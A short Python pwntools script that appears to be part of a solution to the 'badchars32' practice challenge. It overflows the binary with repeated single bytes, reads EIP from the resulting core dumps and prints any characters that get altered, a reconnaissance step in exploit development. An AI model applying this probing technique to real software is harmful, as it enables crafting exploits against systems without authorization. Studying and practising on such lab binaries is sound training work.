from pwn import *
import warnings
import subprocess
import os
warnings.filterwarnings("ignore")
badcharslist = bytes(range(256))

exe = './badchars32'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warn'
context.delete_corefiles = True

for i in range(90, 120):
    char_to_test = badcharslist[i:i+1]
    char_buffer = char_to_test * 100
    p = process(exe)
    p.sendlineafter('>', char_buffer)
    p.wait()
    testing = char_to_test.decode("utf-8")
    if i < 16:
    	actual = chr(int(hex(p.corefile.eip)[2:3], 16))
    else:
        actual = chr(int(hex(p.corefile.eip)[2:4], 16))
        
    if actual != testing:
    	print("{} is a bad character".format(testing))

    
